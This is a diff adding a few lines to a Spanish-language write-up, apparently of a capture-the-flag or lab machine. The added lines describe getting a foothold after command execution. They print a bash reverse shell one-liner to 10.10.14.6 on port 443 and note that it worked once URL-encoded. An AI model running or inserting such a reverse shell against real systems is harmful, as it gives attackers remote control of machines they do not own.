@@ -139,6 +139,17 @@ Y ahora podemos ejecutar comandos
 
 ![Resultado de Nmap](IMG/reverse1.png)
 
+Ahora nos mandamos una shell
+
+Probamos la tipica reverseshell pero vemos que no nos funciona
+
+```
+bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
+```
+
+Asi que la urlencodemos y entramos
+
+![Resultado de Nmap](IMG/reverse2.png)
 
 
 
